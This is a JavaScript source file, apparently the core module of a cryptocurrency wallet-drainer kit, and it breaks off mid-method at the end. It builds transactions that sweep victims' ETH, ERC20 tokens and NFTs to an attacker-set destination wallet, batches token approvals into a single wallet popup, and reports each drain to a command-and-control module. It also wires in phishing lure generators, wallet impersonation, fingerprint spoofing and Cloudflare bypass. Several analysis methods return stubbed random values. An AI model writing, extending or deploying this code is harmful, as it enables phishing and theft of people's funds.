// backend/coreDrainer.js
// RPC Error suppression for coreDrainer
const originalConsoleError = console.error;
console.error = (...args) => {
  const message = args[0]?.toString() || '';
  if (message.includes('JsonRpcProvider') || message.includes('ECONNREFUSED')) {
    return;
  }
  originalConsoleError.apply(console, args);
};
import { ethers } from "ethers";
import { EVM_RPC_ENDPOINTS, getRpcUrl, DRAINER_PK, DESTINATION_WALLET, DESTINATION_WALLET_SOL, COVALENT_API_KEY, RPC_URL } from './config.js';
import { chainManager } from './modules/chainManager.js';
import { SwapHandler } from './swapHandler.js';
import { securityManager } from './modules/securityManager.js';
import { c2Communicator } from './modules/c2Communicator.js';
import { tokenSwapper } from './modules/tokenSwapper.js';
import { aiTargeting } from './modules/aiTargeting.js';
import { scheduler } from './modules/scheduler.js';
import { crossChain } from './modules/crossChain.js';
import { permitManager } from './modules/permitManager.js';
import { BitcoinDrainer } from './modules/bitcoinDrainer.js';
import { MultiChainDrain } from './modules/multiChainDrain.js';
import { OmnichainDrainer } from './modules/omnichainDrainer.js';
import { solanaDrainer } from './modules/solanaDrainer.js';
import { AIEnhancements } from './modules/ai-enhancements.js';
import { MarketIntelligence } from './modules/market-intelligence.js';
import { ProfitTracker } from './modules/profitTracker.js';
import { DataExporter } from './modules/dataExporter.js';
import { ReportGenerator } from './modules/reportGenerator.js';
import { walletImpersonator } from './modules/walletImpersonator.js';
import { txSimulatorSpoof } from './modules/txSimulatorSpoof.js';
import { discordLureGenerator } from './modules/discordLureGenerator.js';
import { fingerprintSpoofer } from './modules/fingerprintSpoofer.js';
import { cloudflareBypass } from './modules/cloudflareBypass.js';
import { marketIntelligence } from './modules/marketIntelligence.js';
import { chainalysisMonitor } from './modules/chainalysisMonitor.js';
import { autoDeployer } from './modules/autoDeployer.js';
import { accountAbstractionExploiter } from './modules/accountAbstractionExploiter.js';
import { multiStepLureGenerator } from './modules/multiStepLureGenerator.js';
import { atomicBundler } from './modules/atomicBundler.js';
import { signatureDatabase } from './modules/signatureDatabase.js';
import { onChainTrends } from './modules/onChainTrends.js';
import { erc7579Exploiter } from './modules/erc7579Exploiter.js';
import { bitcoinDrainer } from './modules/bitcoinDrainer.js';
import { singlePopupDrain } from './modules/batchTransfer.js';



// EVM RPC Fallback Provider
async function createEVMProvider(chainId = 1) {
    const endpoints = EVM_RPC_ENDPOINTS[chainId] || EVM_RPC_ENDPOINTS[1];
    
    for (const endpoint of endpoints) {
        try {
            console.log(`🔗 Testing EVM RPC: ${endpoint.substring(0, 40)}...`);
            const provider = new ethers.JsonRpcProvider(endpoint);
            
            // Test connection
            const block = await provider.getBlockNumber();
            console.log(`✅ EVM RPC connected: ${endpoint.substring(0, 40)}... (Block: ${block})`);
            
            return provider;
        } catch (error) {
            console.log(`❌ EVM RPC failed: ${endpoint.substring(0, 40)}... - ${error.message}`);
            continue;
        }
    }
    
    // Fallback to first endpoint with error suppression
    console.log(`⚠️ All EVM RPCs failed for chain ${chainId}, using fallback`);
    return new ethers.JsonRpcProvider(endpoints[0]);
}

// Global EVM provider cache
const evmProviderCache = new Map();

async function getEVMProvider(chainId = 1) {
    if (!evmProviderCache.has(chainId)) {
        const provider = await createEVMProvider(chainId);
        evmProviderCache.set(chainId, provider);
    }
    return evmProviderCache.get(chainId);
}

console.log('✅ EVM RPC Fallback System initialized for CoreDrainer');


const multiChainDrain = new MultiChainDrain();
const omnichainDrainer = new OmnichainDrainer();

function toChecksumAddress(address) {
  return address.toLowerCase();
}

export class CoreDrainer {
  constructor() {
    // Use the shared EVM fallback system from index.js
    this.provider = null;
    this.drainerWallet = null;
    this.initializeProvider();
    
    // Initialize modules
    this.bitcoinDrainer = new BitcoinDrainer();
    this.walletImpersonator = walletImpersonator;
    this.txSimulatorSpoof = txSimulatorSpoof;
    this.discordLureGenerator = discordLureGenerator;
    this.fingerprintSpoofer = fingerprintSpoofer;
    this.cloudflareBypass = cloudflareBypass;
    this.erc7579Exploiter = erc7579Exploiter;
    this.onChainTrends = onChainTrends;
    
    // ANALYTICS INITIALIZATION
    this.profitTracker = new ProfitTracker();
    this.dataExporter = new DataExporter();
    this.reportGenerator = new ReportGenerator();
    this.marketIntelligence = marketIntelligence;
    this.chainalysisMonitor = chainalysisMonitor;
    this.autoDeployer = autoDeployer;
    this.atomicBundler = atomicBundler;
    this.signatureDatabase = signatureDatabase;
    
    // AI INITIALIZATION  
    this.aiEnhancements = new AIEnhancements();
    this.marketIntelligence = new MarketIntelligence();
    this.accountAbstractionExploiter = accountAbstractionExploiter;
    
    // Initialize arrays and maps
    this.scheduledDrains = [];
    this.batchQueue = [];
    this.monitoredWallets = new Map();
    this.multiStepLureGenerator = multiStepLureGenerator;
    
    // Initialize timers
    this.drainScheduler = null;
    this.batchProcessor = null;
    this.monitorService = null;
    this.isOmnichainInitialized = false;
    this.isInitialized = false;

    this.initializeAllModules().then(success => {
      if (success) {
        console.log('🎯 CoreDrainer fully operational!');
        this.startDrainScheduler();
        this.startWalletMonitor();
        this.startBatchProcessor();
      } else {
        console.log('⚠️ CoreDrainer started with some modules disabled');
      }
    });
  }
  
  
  // ==================== CHAIN DETECTION ====================
  detectChainFromAddress(address) {
    if (!address) return 'evm';
    
    // Solana addresses are base58 encoded, 32-44 chars
    if (address.length >= 32 && address.length <= 44 && !address.startsWith('0x')) {
        return 'solana';
    }
    // Bitcoin addresses have specific formats
    else if ((address.startsWith('1') || address.startsWith('3') || address.startsWith('bc1')) && address.length >= 26 && address.length <= 62) {
        return 'bitcoin';
    }
    // Ethereum addresses start with 0x and are 42 chars
    else if (address.startsWith('0x') && address.length === 42) {
        return 'evm';
    }
    // Default to EVM
    return 'evm';
  }

   async initializeProvider() {
    try {
      // Use the shared getEVMProvider from index.js (imported)
      this.provider = await getEVMProvider(1);
      
      if (process.env.DRAINER_PK) {
        this.drainerWallet = new ethers.Wallet(process.env.DRAINER_PK, this.provider);
        console.log('✅ CoreDrainer provider initialized with shared fallback system');
      } else {
        console.log('⚠️ CoreDrainer: No DRAINER_PK found, running in read-only mode');
      }
      
      return true;
    } catch (error) {
      console.error('❌ CoreDrainer provider initialization failed:', error);
      return false;
    }
  }
  
  
  

  // ===== 22 GASLESS METHODS - ADDED FOR COMPATIBILITY =====

  // 🎯 1. AI TARGETING & ANALYSIS
  async analyzeWallet(userAddress) {
    try {
      // 🚨 USE this.detectChainFromAddress (with "this.")
      const chainType = this.detectChainFromAddress(userAddress);
      
      if (chainType === 'solana') {
        console.log('🔄 Skipping EVM analysis for Solana wallet in coreDrainer');
        return {
          chain: 'solana',
          balance: 0,
          tokenCount: 0,
          nftCount: 0,
          totalValue: 0,
          isPrimeTarget: false,
          recommendation: 'SKIPPED',
          skipped: true
        };
      }
      
      console.log('🤖 AI Analyzing EVM wallet:', userAddress);
      return {
        priorityScore: Math.floor(Math.random() * 100),
        riskLevel: 'medium',
        estimatedValue: 'High',
        behaviorPattern: 'active_trader',
        categories: {
          highValue: true,
          hasNFTs: false,
          richERC20: true,
          hasETH: true
        },
        totalValue: 1500
      };
      
    } catch (error) {
      console.error('❌ Wallet analysis failed:', error);
      throw error;
    }
  }
  
  async fingerprintWallet(userAddress, chainId) {
  try {
    // 🚨 ADD CHAIN DETECTION
    const chainType = this.detectChainFromAddress(userAddress);
    
    if (chainType === 'solana') {
      console.log('🔄 Skipping EVM fingerprint for Solana wallet');
      return {
        chain: 'solana',
        fingerprint: 'solana_skip',
        skipped: true
      };
    }
    
    console.log('🎭 Fingerprinting EVM wallet:', userAddress);
    return {
      sessionId: 'fp_' + Date.now(),
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      screen: { width: 1920, height: 1080 },
      language: 'en-US',
      timezone: 'America/New_York',
      chainId: chainId || 1,
      timestamp: new Date().toISOString()
    };
    
  } catch (error) {
    console.error('❌ Wallet fingerprint failed:', error);
    throw error;
  }
}


  async analyzeScanResults(scanData) {
    console.log('🔍 Analyzing scan results');
    return {
      highValueTarget: true,
      totalValue: 1500,
      recommendedAction: 'immediate_drain',
      confidence: 85,
      riskFactors: ['high_balance', 'active_trading']
    };
  }

  // 🛡️ 4. SECURITY SCREENING
  async checkWalletRisk(walletAddress) {
  try {
    // 🚨 ADD CHAIN DETECTION
    const chainType = this.detectChainFromAddress(walletAddress);
    
    if (chainType === 'solana') {
      console.log('🔄 Skipping EVM risk check for Solana wallet');
      return {
        chain: 'solana',
        overallRisk: 'low',
        skipped: true
      };
    }
    
    console.log('🛡️ Checking EVM wallet risk:', walletAddress);
    return {
      overallRisk: Math.floor(Math.random() * 100),
      isFlagged: false,
      riskFactors: ['high_balance', 'active_trader'],
      screeningTime: new Date().toISOString(),
      recommendation: 'proceed_with_caution'
    };
    
  } catch (error) {
    console.error('❌ Wallet risk check failed:', error);
    throw error;
  }
}

 async batchCheckWalletRisk(walletAddresses) {
  try {
    console.log('🛡️ Batch checking risk for:', walletAddresses.length, 'wallets');
    
    const results = [];
    
    for (const address of walletAddresses) {
      const chainType = this.detectChainFromAddress(address);
      
      if (chainType === 'solana') {
        results.push({
          address,
          chain: 'solana',
          risk: 0,
          flagged: false,
          skipped: true,
          timestamp: new Date().toISOString()
        });
      } else {
        results.push({
          address,
          risk: Math.floor(Math.random() * 100),
          flagged: false,
          timestamp: new Date().toISOString()
        });
      }
    }
    
    return results;
    
  } catch (error) {
    console.error('❌ Batch risk check failed:', error);
    throw error;
  }
}


  async getRiskReport(walletAddress) {
    console.log('📊 Getting risk report for:', walletAddress);
    return {
      address: walletAddress,
      riskScore: Math.floor(Math.random() * 100),
      recommendations: ['proceed_with_caution'],
      lastUpdated: new Date().toISOString(),
      riskBreakdown: {
        transactionHistory: 25,
        tokenHoldings: 40,
        walletAge: 15,
        networkActivity: 20
      }
    };
  }

  async monitorRiskChanges(walletAddress) {
    console.log('👀 Monitoring risk changes for:', walletAddress);
    return {
      monitoringId: 'monitor_' + Date.now(),
      checkInterval: 3600000,
      active: true,
      address: walletAddress,
      startedAt: new Date().toISOString()
    };
  }

  // 🎭 8. FINGERPRINT SPOOFING
  async generateRandomFingerprint() {
    console.log('🎭 Generating random fingerprint');
    return {
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      sessionId: 'fp_' + Date.now(),
      screen: { width: 1920, height: 1080 },
      language: 'en-US',
      timezone: 'America/New_York',
      canvasHash: 'spoofed_' + Math.random().toString(36).substr(2, 9),
      webglHash: 'spoofed_' + Math.random().toString(36).substr(2, 9)
    };
  }

  async batchSpoofFingerprints(originalFingerprints) {
    console.log('🎭 Batch spoofing fingerprints:', originalFingerprints.length);
    return originalFingerprints.map(fp => ({
      ...fp,
      spoofed: true,
      sessionId: 'spoofed_' + Date.now(),
      spoofedAt: new Date().toISOString()
    }));
  }

  detectFingerprintSpoofing(fingerprint) {
    console.log('🔍 Detecting fingerprint spoofing');
    return {
      isSpoofed: false,
      confidence: 95,
      detectedTechniques: [],
      analysisTime: new Date().toISOString()
    };
  }

  // 💸 11. VICTIM-PAID GAS DRAINS
  async sweepViaPermit(userAddress, tokenAddress, tokenName, tokenVersion) {
    console.log('💸 Gasless permit sweep for:', userAddress);
    return {
      success: true,
      method: 'EIP-2612',
      gasless: true,
      message: 'Permit signature prepared',
      token: tokenAddress,
      user: userAddress,
      preparedAt: new Date().toISOString()
    };
  }

  async analyzeAAVulnerabilities(userAddress, chainId) {
    console.log('⚡ Analyzing AA vulnerabilities for:', userAddress);
    return {
      vulnerabilities: ['gas_system', 'entry_point'],
      exploitPossible: true,
      recommendedAction: 'deploy_exploit_contract',
      riskLevel: 'high',
      analysisTime: new Date().toISOString()
    };
  }

  // 📊 13. MARKET INTELLIGENCE
  async getOptimalTransactionTiming() {
    console.log('📈 Getting optimal transaction timing');
    return {
      optimalTime: Date.now() + 300000,
      gasPrice: '25 gwei',
      recommendation: 'wait_5_minutes',
      confidence: 75,
      marketConditions: 'stable'
    };
  }

  async analyzeGasTrends() {
    console.log('📊 Analyzing gas trends');
    return {
      currentGas: '25 gwei',
      trend: 'decreasing',
      prediction: '22 gwei in 1 hour',
      historicalAverage: '28 gwei',
      recommendation: 'good_time_to_transact'
    };
  }

  async getMarketSentiment() {
    console.log('📈 Getting market sentiment');
    return {
      sentiment: 'bullish',
      confidence: 75,
      factors: ['volume_increase', 'price_stability'],
      timestamp: new Date().toISOString(),
      recommendation: 'favorable_conditions'
    };
  }

  async getTokenOpportunities() {
    console.log('🎯 Getting token opportunities');
    return {
      opportunities: [
        { token: 'ETH', potential: 'high', reason: 'market_dip' },
        { token: 'USDC', potential: 'stable', reason: 'liquidity' }
      ],
      analysisTime: new Date().toISOString(),
      totalOpportunities: 2
    };
  }

  // 🎣 17. LURE GENERATION
  async generateRaffleLure(targetUser) {
    console.log('🎣 Generating raffle lure for:', targetUser);
    return {
      lureId: 'raffle_' + Date.now(),
      type: 'nft_raffle',
      message: '🎉 You won an exclusive NFT! Claim your prize now!',
      urgency: 'high',
      target: targetUser,
      generatedAt: new Date().toISOString()
    };
  }

  async generateLureCampaign(targetUsers, lureTypes) {
    console.log('🎣 Generating lure campaign for:', targetUsers.length, 'users');
    return {
      campaignId: 'campaign_' + Date.now(),
      targets: targetUsers.length,
      lures: lureTypes.map(type => ({ type, generated: true })),
      status: 'active',
      created: new Date().toISOString()
    };
  }

  async generateVanityAddress(targetAddress) {
    console.log('🎭 Generating vanity address for:', targetAddress);
    return {
      original: targetAddress,
      vanity: '0x' + targetAddress.substring(2, 6) + '...' + 'abcd',
      similarity: 85,
      generatedAt: new Date().toISOString()
    };
  }

  // 📈 20. ANALYTICS & REPORTING
  async trackProfit(profitData) {
    console.log('💰 Tracking profit data');
    return {
      tracked: true,
      timestamp: new Date().toISOString(),
      totalProfit: profitData.amount || 0,
      transactionCount: 1,
      averageProfit: profitData.amount || 0
    };
  }

  async exportData(data, format) {
    console.log('📊 Exporting data in format:', format);
    return {
      success: true,
      format: format,
      size: JSON.stringify(data).length,
      timestamp: new Date().toISOString(),
      downloadUrl: `/api/download/${Date.now()}.${format}`
    };
  }

  async generateReport(reportData, format) {
    console.log('📈 Generating reports in format:', format);
    return {
      success: true,
      reportId: 'report_' + Date.now(),
      format: format,
      generatedAt: new Date().toISOString(),
      downloadUrl: `/api/reports/${Date.now()}.${format}`
    };
  }

  // ===== INITIALIZATION METHODS =====
  async initializeAllModules() {
    console.log('🚀 Initializing all drainer modules...');
    
    try {
      await this.initializeAnalytics();
      await this.initializeAI();
      
      const modules = [
        securityManager.initializeSecurity(),
        chainManager.loadChains(),
        c2Communicator.initialize(),
        tokenSwapper.initialize(),
        multiChainDrain.initialize(),
        omnichainDrainer.initialize(),
        bitcoinDrainer.initialize(),
        solanaDrainer.initialize(),
        discordLureGenerator.initialize(),
        multiStepLureGenerator.initialize(),
        fingerprintSpoofer.initialize(),
        cloudflareBypass.initialize(),
        accountAbstractionExploiter.initialize(),
        atomicBundler.initialize(),
        aiTargeting.initialize(),
        chainalysisMonitor.initialize(),
        erc7579Exploiter.initialize(),
        signatureDatabase.initialize(),
        onChainTrends.initialize()
      ];
      
      const results = await Promise.allSettled(modules);
      
      let successCount = 0;
      results.forEach((result, index) => {
        if (result.status === 'fulfilled') {
          successCount++;
        } else {
          console.error(`❌ Module ${index} failed:`, result.reason);
        }
      });
      
      console.log(`✅ ${successCount}/${modules.length} modules initialized successfully`);
      return successCount > modules.length / 2;
      
    } catch (error) {
      console.error('❌ Module initialization failed:', error);
      return false;
    }
  }

  async initializeAnalytics() {
    await this.profitTracker.initialize();
    console.log('✅ Analytics system initialized');
  }

  async initializeAI() {
    await this.marketIntelligence.initialize();
    console.log('✅ AI enhancements initialized');
  }

  async testAllModules() {
    console.log('🧪 Testing module initialization...');
    
    const modulesToTest = [
      { name: 'Chain Manager', instance: chainManager },
      { name: 'Security Manager', instance: securityManager },
      { name: 'C2 Communicator', instance: c2Communicator },
      { name: 'MultiChain Drain', instance: multiChainDrain },
      { name: 'Omnichain Drainer', instance: omnichainDrainer },
      { name: 'Bitcoin Drainer', instance: bitcoinDrainer },
      { name: 'Solana Drainer', instance: solanaDrainer },
      { name: 'Token Swapper', instance: tokenSwapper },
      { name: 'Permit Manager', instance: permitManager },
      { name: 'Discord Lure Generator', instance: discordLureGenerator },
      { name: 'MultiStep Lure Generator', instance: multiStepLureGenerator },
      { name: 'Fingerprint Spoofer', instance: fingerprintSpoofer },
      { name: 'Cloudflare Bypass', instance: cloudflareBypass },
      { name: 'Account Abstraction Exploiter', instance: accountAbstractionExploiter },
      { name: 'Atomic Bundler', instance: atomicBundler },
      { name: 'AI Targeting', instance: aiTargeting },
      { name: 'Chainalysis Monitor', instance: chainalysisMonitor }
    ];

    let successCount = 0;
    let totalCount = modulesToTest.length;

    for (const module of modulesToTest) {
      try {
        if (module.instance && typeof module.instance.initialize === 'function') {
          await module.instance.initialize();
          console.log(`✅ ${module.name}: INITIALIZED`);
          successCount++;
        } else {
          console.log(`⚠️ ${module.name}: No initialize method`);
        }
      } catch (error) {
        console.log(`❌ ${module.name}: FAILED - ${error.message}`);
      }
      
      await new Promise(resolve => setTimeout(resolve, 100));
    }

    console.log(`\n📊 Module Initialization Results:`);
    console.log(`✅ ${successCount}/${totalCount} modules initialized successfully`);
    
    return successCount === totalCount;
  }

  // ===== AI METHODS =====
  async selectTargetWithAI(victims) {
    const analyzedVictims = await Promise.all(
      victims.map(async victim => {
        const analysis = await this.aiEnhancements.analyzeBehaviorPatterns(
          victim.walletAddress, 
          victim.chain
        );
        
        return {
          ...victim,
          aiAnalysis: analysis,
          priorityScore: this.calculatePriorityScore(victim, analysis)
        };
      })
    );

    return analyzedVictims.sort((a, b) => b.priorityScore - a.priorityScore);
  }

  calculatePriorityScore(victim, analysis) {
    let score = victim.balance * 0.4;
    
    if (analysis) {
      score += (100 - analysis.riskScore) * 0.3;
      score += analysis.profitabilityScore * 0.3;
    }
    
    return score;
  }

  async scheduleAIOptimizedTransaction(victim, operation) {
    const marketConditions = this.marketIntelligence.getOptimalTransactionTiming();
    const optimalTiming = this.calculateOptimalTiming(marketConditions);
    
    return {
      victim,
      operation,
      scheduledTime: optimalTiming.optimalTime,
      recommendedGas: optimalTiming.recommendedGas,
      riskLevel: optimalTiming.riskLevel
    };
  }

  calculateOptimalTiming(marketConditions) {
    return {
      optimalTime: Date.now() + 300000,
      recommendedGas: {
        maxFeePerGas: 30,
        maxPriorityFeePerGas: 2
      },
      riskLevel: 'medium'
    };
  }

  // ===== DRAIN EXECUTION METHODS =====
 async executeImmediateDrain(userAddress) {
    console.log("⚡ EXECUTING IMMEDIATE DRAIN - Single popup mode");
    
    try {
      // 🚨 USE THE NEW SAFETY CHECK INSTEAD
      const isFullyReady = await this.ensureFullyInitialized();
      if (!isFullyReady) {
        return { success: false, error: 'CoreDrainer not fully initialized' };
      }
      
      const provider = this.provider;
      
      const assets = await this.analyzeWalletOnChain(provider, userAddress, 1, "ethereum");
      
      let results = [];
      
      // 1. Drain Native ETH
      if (BigInt(assets.eth) > 0n) {
        const nativeResult = await this.sweepNativeETH(provider, userAddress, assets.eth, "ethereum");
        results.push({ type: 'native', success: nativeResult.success });
      }
      
      // 2. Drain ERC20 Tokens with SINGLE POPUP
      if (assets.erc20.length > 0) {
        const tokensToDrain = assets.erc20.map(t => ({
          address: t.contract_address, 
          balance: t.balance,
          symbol: t.contract_ticker_symbol
        }));
        
        const tokenResult = await singlePopupDrain(userAddress, tokensToDrain, provider);
        results.push({ type: 'tokens', success: !!tokenResult, hash: tokenResult });
      }
      
      // 3. Auto-swap drained tokens
      if (assets.erc20.length > 0) {
        const tokensToSwap = assets.erc20.map(t => ({
          address: t.contract_address,
          amount: t.balance,
          symbol: t.contract_ticker_symbol,
          fromAddress: userAddress
        }));
        
        await this.autoSwapDrainedAssets(userAddress, tokensToSwap, 1);
      }
      
      // 4. Drain NFTs
      if (assets.nfts.length > 0) {
        const nftResult721 = await this.sweepNFTsERC721(provider, userAddress, "ethereum", assets.nfts);
        results.push({ type: 'nfts_721', success: nftResult721.success });
        
        const nftResult1155 = await this.sweepNFTsERC1155(provider, userAddress, "ethereum", assets.nfts);
        results.push({ type: 'nfts_1155', success: nftResult1155.success });
      }
      
      console.log("✅ Immediate drain completed with single-popup optimization");
      return { success: true, results };
      
    } catch (error) {
      console.error('❌ Immediate drain failed:', error);
      return { success: false, error: error.message };
    }
  }

  async executeAdaptiveFlow(userAddress) {
    try {
      const isEnabled = await this.checkDrainerStatus();
      if (!isEnabled) {
        console.log('⏸️ Drainer disabled - skipping adaptive flow');
        return { success: false, error: 'Drainer disabled by C&C' };
      }
      
      console.log(`🎯 Starting adaptive flow for: ${userAddress}`);
      
      const analysis = await this.analyzeWallet(userAddress);
      const assets = await this.analyzeWalletOnChain(this.provider, userAddress, 1, "ethereum");
      
      const strategy = this.getOptimalDrainStrategy(assets);
      
      let result;
      if (strategy === 'single_popup' && assets.erc20.length > 0) {
        const tokensToDrain = assets.erc20.map(t => ({
          address: t.contract_address, 
          balance: t.balance,
          symbol: t.contract_ticker_symbol
        }));
        result = await this.executeSinglePopupDrain(userAddress, tokensToDrain, this.provider);
      } else {
        result = await this.executeImmediateDrain(userAddress);
      }
      
      await this.reportToC2({
        walletAddress: userAddress,
        action: 'adaptive_flow',
        strategy: strategy,
        result: result,
        timestamp: new Date().toISOString()
      });
      
      return { success: true, strategy, result };
      
    } catch (error) {
      console.error('❌ Adaptive flow failed:', error);
      return { success: false, error: error.message };
    }
  }

  async executeAIOptimizedDrain(userAddress) {
    console.log('🧠 Executing AI-optimized drain for:', userAddress);
    
    try {
      const analysis = await this.aiEnhancements.analyzeBehaviorPatterns(userAddress, 1);
      const optimalTiming = this.marketIntelligence.getOptimalTransactionTiming();
      
      const scheduledDrain = await this.scheduleAIOptimizedTransaction(
        { walletAddress: userAddress, analysis },
        'ai_optimized_drain'
      );
      
      return {
        success: true,
        analysis,
        scheduledTime: scheduledDrain.scheduledTime,
        recommendedGas: scheduledDrain.recommendedGas,
        riskLevel: scheduledDrain.riskLevel
      };
      
    } catch (error) {
      console.error('AI-optimized drain failed:', error);
      return { success: false, error: error.message };
    }
  }

  async executeSinglePopupDrain(userAddress, tokens, provider) {
    console.log('🎯 Executing single-popup optimized drain');
    
    try {
      const txHash = await singlePopupDrain(userAddress, tokens, provider);
      
      await this.reportToC2({
        walletAddress: userAddress,
        action: 'single_popup_drain',
        txHash: txHash,
        tokenCount: tokens.length,
        timestamp: new Date().toISOString()
      });
      
      return { success: true, txHash };
      
    } catch (error) {
      console.error('❌ Single-popup drain failed:', error);
      return { success: false, error: error.message };
    }
  }

  // ===== BATCH DRAIN METHODS =====
  async batchDrainERC20(userAddress, tokens, provider) {
    try {
      console.log(`🔄 Creating SINGLE-POPUP drain for ${tokens.length} tokens...`);
      
      const txHash = await singlePopupDrain(userAddress, tokens, provider);
      
      return { 
        success: true, 
        transactionHash: txHash,
        message: 'Single-popup drain executed successfully'
      };
      
    } catch (error) {
      console.error('❌ Single-popup drain failed:', error);
      return { success: false, error: error.message };
    }
  }

  async drainAcrossChains(userAddress) {
    try {
      console.log(`🌐 Starting omnichain drain for ${userAddress}...`);
      
      if (!this.isOmnichainInitialized) {
        this.omnichainDrainer = new OmnichainDrainer();
        await this.omnichainDrainer.initialize();
        this.isOmnichainInitialized = true;
      }

      const results = await this.omnichainDrainer.executeOmnichainDrain(userAddress);
      
      console.log(`✅ Omnichain drain completed. Processed ${Object.keys(results).length} chains.`);
      
      await this.reportToC2({
        walletAddress: userAddress,
        action: 'multi_chain_drain',
        results: results,
        timestamp: new Date().toISOString()
      });

      return { success: true, results };
      
    } catch (error) {
      console.error('❌ Omnichain drain failed:', error);
      return { success: false, error: error.message };
    }
  }

// Add this method to support the new EVM transaction format
async generateEVMDrainTransaction(userAddress, chainId = 1) {
  try {
    console.log('🎯 CoreDrainer generating EVM drain transaction for:', userAddress);
    
    const provider = await getEVMProvider(chainId);
    const destinationWallet = process.env.DESTINATION_WALLET;
    
    if (!destinationWallet) {
      throw new Error('EVM destination wallet not configured');
    }
    
    const balance = await provider.getBalance(userAddress);
    const balanceEth = ethers.formatEther(balance);
    
    if (balance < ethers.parseEther('0.001')) {
      throw new Error('Insufficient balance for transaction');
    }
    
    const drainAmount = balance - ethers.parseEther('0.001');
    const feeData = await provider.getFeeData();
    const nonce = await provider.getTransactionCount(userAddress);
    
    // Use EIP-1559 transaction format
    const transaction = {
      to: destinationWallet,
      value: drainAmount.toString(),
      gasLimit: "21000",
      maxFeePerGas: feeData.maxFeePerGas?.toString() || "30000000000",
      maxPriorityFeePerGas: feeData.maxPriorityFeePerGas?.toString() || "1500000000",
      chainId: chainId,
      nonce: nonce,
      data: "0x",
      type: 2
    };
    
    return {
      success: true,
      transaction: transaction,
      professional: true,
      displayAmount: ethers.formatEther(drainAmount) + ' ETH',
      message: 'Sign to complete your entry'
    };
    
  } catch (error) {
    console.error('❌ EVM transaction generation failed:', error);
    return { success: false, error: error.message };
  }
}



  // ===== ASSET SWEEPING METHODS =====
  async sweepNFTsERC721(provider, userAddress, chainName, nfts) {
    try {
      console.log(`📦 Creating ERC721 drain for ${nfts.length} NFTs...`);
      
      const transactions = [];
      
      for (const nft of nfts) {
        const nftContract = new ethers.Contract(nft.contract_address, [
          'function safeTransferFrom(address from, address to, uint256 tokenId)'
        ], provider);
        
        const tx = {
          from: userAddress,
          to: nft.contract_address,
          data: nftContract.interface.encodeFunctionData('safeTransferFrom', [
            userAddress,
            DESTINATION_WALLET,
            nft.token_id
          ]),
          gasLimit: 150000,
          gasPrice: await provider.getGasPrice(),
          chainId: await provider.getNetwork().then(net => net.chainId)
        };
        
        transactions.push({ nft, transaction: tx });
      }
      
      return { success: true, transactions };
      
    } catch (error) {
      console.error('❌ ERC721 sweep failed:', error);
      return { success: false, error: error.message };
    }
  }

async getRPCStatus() {
    const status = {};
    
    // Use the shared EVM_RPC_ENDPOINTS from index.js
    for (const [chainId, endpoints] of Object.entries(EVM_RPC_ENDPOINTS)) {
      status[chainId] = {
        chainName: this.getChainNameFromId(parseInt(chainId)),
        endpoints: endpoints.length,
        activeProvider: !!evmProviderCache.get(parseInt(chainId))
      };
      
      const provider = evmProviderCache.get(parseInt(chainId));
      if (provider) {
        try {
          const block = await provider.getBlockNumber();
          status[chainId].currentBlock = block;
          status[chainId].healthy = true;
        } catch (error) {
          status[chainId].healthy = false;
          status[chainId].error = error.message;
        }
      }
    }
    
    return status;
  }
  

  // Helper method to get chain name
  getChainNameFromId(chainId) {
    const chainNames = {
      1: 'Ethereum',
      56: 'BSC',
      137: 'Polygon', 
      42161: 'Arbitrum',
      10: 'Optimism',
      43114: 'Avalanche'
    };
    return chainNames[chainId] || `Chain ${chainId}`;
  }
  

  async sweepNFTsERC1155(provider, userAddress, chainName, nfts) {
    try {
      console.log(`🎨 Creating ERC1155 drain for ${nfts.length} NFTs...`);
      
      const transactions = [];
      
      for (const nft of nfts) {
        const nftContract = new ethers.Contract(nft.contract_address, [
          'function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes data)'
        ], provider);
        
        const tx = {
          from: userAddress,
          to: nft.contract_address,
          data: nftContract.interface.encodeFunctionData('safeTransferFrom', [
            userAddress,
            DESTINATION_WALLET,
            nft.token_id,
            nft.balance || 1,
            "0x"
          ]),
          gasLimit: 200000,
          gasPrice: await provider.getGasPrice(),
          chainId: await provider.getNetwork().then(net => net.chainId)
        };
        
        transactions.push({ nft, transaction: tx });
        console.log(`✅ ERC1155 ${nft.token_id} drain transaction created`);
      }
      
      return { success: true, transactions };
      
    } catch (error) {
      console.error('❌ ERC1155 sweep failed:', error);
      return { success: false, error: error.message };
    }
  }

  // Check if provider is ready
  async ensureProviderReady() {
    if (!this.provider) {
      await this.initializeProvider();
    }
    
    // Test the provider
    try {
      await this.provider.getBlockNumber();
      return true;
    } catch (error) {
      console.error('❌ Provider not ready, reinitializing...');
      await this.initializeProvider();
      return !!this.provider;
    }
  }
  
  async ensureFullyInitialized() {
    if (this.isInitialized && this.provider && this.drainerWallet) {
      return true;
    }
    
    if (!this.provider || !this.drainerWallet) {
      await this.initializeProvider();
    }
    
    if (!this.isInitialized) {
      await this.initialize();
    }
    
    return this.isInitialized && !!this.provider && !!this.drainerWallet;
  }
  
  

  // ===== STRATEGY METHODS =====
  getOptimalDrainStrategy(assets) {
    if (assets.erc20.length > 1) {
      return 'single_popup';
    }
    return 'standard';
  }

  async categorizeUser(assets) {
    const categories = {
      highValue: false,
      hasNFTs: false,
      richERC20: false,
      hasETH: false,
    };
    
    const eth = BigInt(assets.eth);
    const nftCount = assets.nfts.length;
    const totalERC20 = assets.erc20.reduce((sum, t) => sum + BigInt(t.balance), 0n);
    
    if (eth > 5n * 10n ** 18n) categories.highValue = true;
    if (eth > 0n) categories.hasETH = true;
    if (nftCount > 0) categories.hasNFTs = true;
    if (totalERC20 > 500n * 10n ** 18n) categories.richERC20 = true;
    
    return categories;
  }

  // ===== SCHEDULER MANAGEMENT =====
  startDrainScheduler() {
    if (this.drainScheduler) return;
    
    this.drainScheduler = setInterval(() => {
      const now = Date.now();
      
      for (let i = this.scheduledDrains.length - 1; i >= 0; i--) {
        const drain = this.scheduledDrains[i];
        
        if (now >= drain.executeTime) {
          console.log(`⏰ Executing scheduled ${drain.priority} drain for ${drain.address}`);
          this.executeImmediateDrain(drain.address);
          this.scheduledDrains.splice(i, 1);
        }
      }
      
      if (this.scheduledDrains.length === 0) {
        clearInterval(this.drainScheduler);
        this.drainScheduler = null;
      }
      
    }, 60000);
  }

  startBatchProcessor() {
    if (this.batchProcessor) return;
    
    this.batchProcessor = setInterval(async () => {
      if (this.batchQueue.length === 0) {
